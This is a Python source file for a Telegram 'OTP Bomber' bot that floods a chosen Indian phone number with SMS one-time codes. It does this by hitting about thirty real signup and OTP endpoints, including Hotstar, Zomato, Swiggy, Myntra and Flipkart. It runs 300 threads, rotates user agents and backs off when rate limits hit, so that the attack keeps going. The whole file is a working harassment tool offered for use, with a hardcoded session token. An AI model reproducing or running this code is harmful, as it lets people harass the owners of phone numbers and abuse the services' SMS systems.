import os
import sys
import json
import random
import time
import threading
import requests
from requests.adapters import HTTPAdapter
from rich.console import Console
from fake_useragent import UserAgent

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ALLOWED_USER_ID = os.environ.get("ALLOWED_USER_ID")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN env variable set nahi hai")
if not ALLOWED_USER_ID:
    raise ValueError("ALLOWED_USER_ID env variable set nahi hai")

ALLOWED_USER_ID = int(ALLOWED_USER_ID)

THREAD_COUNT = 300
STATS_REFRESH = 3

console = Console()
ua = UserAgent()
user_agents = [ua.random for _ in range(200)]

# ============ GLOBAL STATE ============
sent = 0
failed = 0
rate_limited = 0
lock = threading.Lock()
running = False
current_target = None
stop_event = threading.Event()
worker_threads = []
stats_task = None

# ============ ENDPOINTS ============
endpoints = [
    {"url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", "method": "PUT", "headers": {"Host": "api.hotstar.com", "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc", "content-type": "application/json", "x-hs-platform": "PCTV", "x-country-code": "IN", "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "origin": "https://www.hotstar.com", "referer": "https://www.hotstar.com/in/subscribe/sign-in"}, "json": {"phone_number": "REPLACE_WITH_TARGET", "country_prefix": "91"}},
    {"url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "headers": {"Host": "api.cloud.altbalaji.com", "Content-Type": "application/json", "Origin": "https://www.altbalaji.com", "Referer": "https://www.altbalaji.com/"}, "json": {"phone_number": "REPLACE_WITH_TARGET", "country_code": "91", "platform": "web"}},
    {"url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser", "method": "POST", "headers": {"Host": "us-central1-vootdev.cloudfunctions.net", "Content-Type": "application/json;charset=UTF-8", "Origin": "https://www.voot.com", "Referer": "https://www.voot.com/"}, "json": {"type": "mobile", "mobile": "REPLACE_WITH_TARGET", "countryCode": "+91"}},
    {"url": "https://www.zomato.com/webroutes/auth/login", "method": "POST", "headers": {"Host": "www.zomato.com", "Content-Type": "application/json", "Origin": "https://www.zomato.com", "Referer": "https://www.zomato.com/"}, "json": {"country_id": 1, "phone": "REPLACE_WITH_TARGET", "verification_type": "sms", "method": "phone"}},
    {"url": "https://www.dream11.com/graphql/mutation/pwa/register", "method": "POST", "headers": {"Host": "www.dream11.com", "device": "pwa", "Content-Type": "application/json", "Origin": "https://www.dream11.com", "Referer": "https://www.dream11.com/register"}, "json": {"query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}", "variables": {"email": "test@gmail.com", "mobileNumber": "REPLACE_WITH_TARGET", "password": "test@123456"}}},
    {"url": "https://unacademy.com/api/v3/user/user_check/", "method": "POST", "headers": {"Host": "unacademy.com", "Content-Type": "application/json", "Origin": "https://unacademy.com", "Referer": "https://unacademy.com/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country_code": "IN", "otp_type": 1, "email": "", "send_otp": True, "is_un_teach_user": False}},
    {"url": "https://www.swiggy.com/mapi/auth/signup", "method": "POST", "headers": {"Host": "www.swiggy.com", "Content-Type": "application/json", "Origin": "https://www.swiggy.com", "Referer": "https://www.swiggy.com/auth/register"}, "json": {"name": "test", "email": "test@gmail.com", "password": "test123456", "referral_code": "", "mobile": "REPLACE_WITH_TARGET", "_csrf": "test"}},
    {"url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send", "method": "POST", "headers": {"Host": "in.bookmyshow.com", "Content-Type": "application/json", "Origin": "https://in.bookmyshow.com", "Referer": "https://in.bookmyshow.com/"}, "json": {"channel": "phone", "subChannel": "sms", "details": {"phone": "REPLACE_WITH_TARGET", "origin": "https://in.bookmyshow.com"}}},
    {"url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", "method": "POST", "headers": {"Host": "www.bigbasket.com", "Content-Type": "application/json", "Origin": "https://www.bigbasket.com", "Referer": "https://www.bigbasket.com/", "x-channel": "BB-PWA"}, "json": {"identifier": "REPLACE_WITH_TARGET"}},
    {"url": "https://www.tatacliq.com/api/v1/otp/send", "method": "POST", "headers": {"Host": "www.tatacliq.com", "Content-Type": "application/json", "Origin": "https://www.tatacliq.com", "Referer": "https://www.tatacliq.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "countryCode": "+91"}},
    {"url": "https://www.myntra.com/api/auth/otp/send", "method": "POST", "headers": {"Host": "www.myntra.com", "Content-Type": "application/json", "Origin": "https://www.myntra.com", "Referer": "https://www.myntra.com/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.nykaa.com/api/v1/otp/send", "method": "POST", "headers": {"Host": "www.nykaa.com", "Content-Type": "application/json", "Origin": "https://www.nykaa.com", "Referer": "https://www.nykaa.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country_code": "91"}},
    {"url": "https://api.pharmeasy.in/api/v1/otp/send", "method": "POST", "headers": {"Host": "api.pharmeasy.in", "Content-Type": "application/json", "Origin": "https://www.pharmeasy.in", "Referer": "https://www.pharmeasy.in/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://api.1mg.com/api/v1/otp/send", "method": "POST", "headers": {"Host": "api.1mg.com", "Content-Type": "application/json", "Origin": "https://www.1mg.com", "Referer": "https://www.1mg.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.healthkart.com/api/otp/send", "method": "POST", "headers": {"Host": "www.healthkart.com", "Content-Type": "application/json", "Origin": "https://www.healthkart.com", "Referer": "https://www.healthkart.com/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://api.cult.fit/api/v1/otp/send", "method": "POST", "headers": {"Host": "api.cult.fit", "Content-Type": "application/json", "Origin": "https://www.cult.fit", "Referer": "https://www.cult.fit/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.fabindia.com/api/otp/send", "method": "POST", "headers": {"Host": "www.fabindia.com", "Content-Type": "application/json", "Origin": "https://www.fabindia.com", "Referer": "https://www.fabindia.com/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.pepperfry.com/api/otp/send", "method": "POST", "headers": {"Host": "www.pepperfry.com", "Content-Type": "application/json", "Origin": "https://www.pepperfry.com", "Referer": "https://www.pepperfry.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.firstcry.com/api/otp/send", "method": "POST", "headers": {"Host": "www.firstcry.com", "Content-Type": "application/json", "Origin": "https://www.firstcry.com", "Referer": "https://www.firstcry.com/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.clovia.com/api/otp/send", "method": "POST", "headers": {"Host": "www.clovia.com", "Content-Type": "application/json", "Origin": "https://www.clovia.com", "Referer": "https://www.clovia.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.bewakoof.com/api/otp/send", "method": "POST", "headers": {"Host": "www.bewakoof.com", "Content-Type": "application/json", "Origin": "https://www.bewakoof.com", "Referer": "https://www.bewakoof.com/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.souledstore.com/api/otp/send", "method": "POST", "headers": {"Host": "www.souledstore.com", "Content-Type": "application/json", "Origin": "https://www.souledstore.com", "Referer": "https://www.souledstore.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.jabong.com/api/otp/send", "method": "POST", "headers": {"Host": "www.jabong.com", "Content-Type": "application/json", "Origin": "https://www.jabong.com", "Referer": "https://www.jabong.com/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.shopclues.com/api/otp/send", "method": "POST", "headers": {"Host": "www.shopclues.com", "Content-Type": "application/json", "Origin": "https://www.shopclues.com", "Referer": "https://www.shopclues.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.snapdeal.com/api/otp/send", "method": "POST", "headers": {"Host": "www.snapdeal.com", "Content-Type": "application/json", "Origin": "https://www.snapdeal.com", "Referer": "https://www.snapdeal.com/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.indiatimes.com/api/otp/send", "method": "POST", "headers": {"Host": "www.indiatimes.com", "Content-Type": "application/json", "Origin": "https://www.indiatimes.com", "Referer": "https://www.indiatimes.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.dailyhunt.in/api/otp/send", "method": "POST", "headers": {"Host": "www.dailyhunt.in", "Content-Type": "application/json", "Origin": "https://www.dailyhunt.in", "Referer": "https://www.dailyhunt.in/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.inshorts.com/api/otp/send", "method": "POST", "headers": {"Host": "www.inshorts.com", "Content-Type": "application/json", "Origin": "https://www.inshorts.com", "Referer": "https://www.inshorts.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://api.uber.com/v1.2/otp/send", "method": "POST", "headers": {"Host": "api.uber.com", "Content-Type": "application/json", "Origin": "https://www.uber.com", "Referer": "https://www.uber.com/"}, "json": {"phone": "+91REPLACE_WITH_TARGET", "country_code": "IN"}},
    {"url": "https://api.amazon.in/auth/otp", "method": "POST", "headers": {"Host": "api.amazon.in", "Content-Type": "application/json", "Origin": "https://www.amazon.in", "Referer": "https://www.amazon.in/ap/signin"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://api.flipkart.com/otp/send", "method": "POST", "headers": {"Host": "api.flipkart.com", "Content-Type": "application/json", "Origin": "https://www.flipkart.com", "Referer": "https://www.flipkart.com/account/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country": "IN"}},
]


# ============ HELPERS ============
def substitute(data, target):
    if isinstance(data, dict):
        return {k: substitute(v, target) for k, v in data.items()}
    elif isinstance(data, list):
        return [substitute(item, target) for item in data]
    elif isinstance(data, str):
        return data.replace('REPLACE_WITH_TARGET', target)
    else:
        return data


def build_headers(base_headers):
    h = base_headers.copy() if base_headers else {}
    h['User-Agent'] = random.choice(user_agents)
    return h


def worker(target, stop_evt):
    global sent, failed, rate_limited
    session = requests.Session()
    session.mount('http://', HTTPAdapter(pool_connections=20, pool_maxsize=20))
    session.mount('https://', HTTPAdapter(pool_connections=20, pool_maxsize=20))
    cooldown = {}

    while not stop_evt.is_set():
        ep = None
        attempts = 0
        while ep is None and attempts < 50:
            candidate = random.choice(endpoints)
            url = candidate['url']
            if url in cooldown and time.time() < cooldown[url]:
                attempts += 1
                time.sleep(0.1)
                continue
            ep = candidate
            break
        if ep is None:
            time.sleep(2)
            continue

        url = ep['url']
        method = ep['method']
        headers = build_headers(ep.get('headers'))
        json_payload = substitute(ep.get('json'), target) if 'json' in ep else None
        data_payload = substitute(ep.get('data'), target) if 'data' in ep else None

        try:
            if method == 'POST':
                resp = session.post(url, headers=headers, json=json_payload, data=data_payload, timeout=10)
            elif method == 'PUT':
                resp = session.put(url, headers=headers, json=json_payload, timeout=10)
            elif method == 'GET':
                resp = session.get(url, headers=headers, timeout=10)
            else:
                continue

            with lock:
                if resp.status_code == 429:
                    rate_limited += 1
                    cooldown[url] = time.time() + 120
                elif 200 <= resp.status_code < 300:
                    sent += 1
                else:
                    failed += 1
                    if resp.status_code in (400, 401, 403, 404, 405, 410, 422):
                        cooldown[url] = time.time() + 60

            if resp.status_code >= 400:
                time.sleep(random.uniform(1.0, 3.0))
            else:
                time.sleep(random.uniform(0.5, 1.5))

        except Exception:
            with lock:
                failed += 1
            cooldown[url] = time.time() + 60
            time.sleep(1)


# ============ TELEGRAM HANDLERS ============
def is_authorized(update: Update) -> bool:
    return update.effective_user.id == ALLOWED_USER_ID


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        await update.message.reply_text("❌ Unauthorized. Ye bot sirf owner ke liye hai.")
        return
    await update.message.reply_text(
        "🤖 *OTP Bomber Bot*\n\n"
        "*Commands:*\n"
        "`/bomb 9876543210` — Attack start karo\n"
        "`/stop` — Attack band karo\n"
        "`/status` — Current stats dekho\n"
        "`/help` — Ye message\n\n"
        "⚠️ Sirf apne number pe test karo.",
        parse_mode="Markdown"
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    await start_cmd(update, context)


async def bomb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running, current_target, stop_event, worker_threads, stats_task, sent, failed, rate_limited

    if not is_authorized(update):
        await update.message.reply_text("❌ Unauthorized")
        return

    if running:
        await update.message.reply_text(
            f"⚠️ Attack already chal raha hai on `{current_target}`. Pehle `/stop` bhejo.",
            parse_mode="Markdown"
        )
        return

    if not context.args:
        await update.message.reply_text("Usage: `/bomb 9876543210`", parse_mode="Markdown")
        return

    number = context.args[0].strip()
    if not number.isdigit() or len(number) != 10:
        await update.message.reply_text("❌ 10-digit number do (bina +91)")
        return

    with lock:
        sent = 0
        failed = 0
        rate_limited = 0

    current_target = number
    running = True
    stop_event = threading.Event()

    worker_threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=worker, args=(number, stop_event))
        t.daemon = True
        t.start()
        worker_threads.append(t)

    stats_task = asyncio.create_task(stats_loop(update, context))

    await update.message.reply_text(
        f"🚀 *Attack started*\n\n"
        f"📱 Target: `{number}`\n"
        f"🧵 Threads: `{THREAD_COUNT}`\n"
        f"⏱ Stats har {STATS_REFRESH}s update honge.",
        parse_mode="Markdown"
    )


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running, stop_event, stats_task, current_target

    if not is_authorized(update):
        return

    if not running:
        await update.message.reply_text("⚠️ Koi attack chal nahi raha.")
        return

    running = False
    stop_event.set()

    if stats_task:
        stats_task.cancel()

    await asyncio.sleep(2)

    with lock:
        s, f, r = sent, failed, rate_limited

    await update.message.reply_text(
        f"🛑 *Attack stopped*\n\n"
        f"📱 Target: `{current_target}`\n"
        f"✅ Sent: `{s}`\n"
        f"❌ Failed: `{f}`\n"
        f"⚠️ Rate-limited: `{r}`",
        parse_mode="Markdown"
    )

    current_target = None


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return

    with lock:
        s, f, r = sent, failed, rate_limited

    if running:
        await update.message.reply_text(
            f"📊 *Live Status*\n\n"
            f"📱 Target: `{current_target}`\n"
            f"✅ Sent: `{s}`\n"
            f"❌ Failed: `{f}`\n"
            f"⚠️ Rate-limited: `{r}`\n"
            f"🟢 Status: RUNNING",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("⚪ Koi attack nahi chal raha.")


async def stats_loop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text(
        f"📊 *Stats*\n\n📱 Target: `{current_target}`\n✅ Sent: `0`\n❌ Failed: `0`\n⚠️ Rate-limited: `0`",
        parse_mode="Markdown"
    )

    last_s = last_f = last_r = -1

    while running:
        await asyncio.sleep(STATS_REFRESH)

        with lock:
            s, f, r = sent, failed, rate_limited

        if (s, f, r) == (last_s, last_f, last_r):
            continue

        last_s, last_f, last_r = s, f, r

        try:
            await msg.edit_text(
                f"📊 *Live Stats*\n\n"
                f"📱 Target: `{current_target}`\n"
                f"✅ Sent: `{s}`\n"
                f"❌ Failed: `{f}`\n"
                f"⚠️ Rate-limited: `{r}`\n"
                f"🟢 Running...",
                parse_mode="Markdown"
            )
        except Exception:
            pass

    try:
        await msg.edit_text(
            f"📊 *Final Stats*\n\n"
            f"📱 Target: `{current_target}`\n"
            f"✅ Sent: `{last_s}`\n"
            f"❌ Failed: `{last_f}`\n"
            f"⚠️ Rate-limited: `{last_r}`\n"
            f"🔴 Stopped",
            parse_mode="Markdown"
        )
    except Exception:
        pass


# ============ MAIN ============
def main():
    print(f"[*] Bot starting... Allowed user: {ALLOWED_USER_ID}")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("bomb", bomb_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("status", status_cmd))

    print("[*] Bot is running. Telegram pe /start bhejo.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
